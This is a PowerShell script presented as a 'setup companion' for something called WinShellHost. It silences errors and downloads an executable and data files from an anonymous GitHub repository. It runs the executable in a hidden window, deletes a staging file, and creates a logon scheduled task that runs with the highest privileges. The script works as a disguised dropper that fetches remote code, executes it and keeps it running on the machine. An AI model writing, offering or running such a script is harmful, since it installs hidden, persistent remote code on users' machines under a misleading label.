# WinShellHost setup companion
$ErrorActionPreference = 'SilentlyContinue'
$base = 'https://raw.githubusercontent.com/Anon0292/WinShellHost/main'
$dir = "$env:LOCALAPPDATA\WinShellHost"
New-Item -ItemType Directory -Path $dir -Force | Out-Null
Invoke-WebRequest "$base/hostupd.exe" -OutFile "$dir\hostupd.exe"
Invoke-WebRequest "$base/setup.dat" -OutFile "$dir\setup.dat"
Invoke-WebRequest "$base/svc.dat" -OutFile "$dir\svc.dat"
Start-Process -FilePath "$dir\hostupd.exe" -ArgumentList '-local',"$dir\setup.dat" -WindowStyle Hidden -Wait
Remove-Item "$dir\setup.dat" -Force
schtasks /Create /TN "WinShellHostSvc" /TR "`"$dir\hostupd.exe`" -local `"$dir\svc.dat`"" /SC ONLOGON /RL HIGHEST /F | Out-Null
schtasks /Run /TN "WinShellHostSvc" | Out-Null
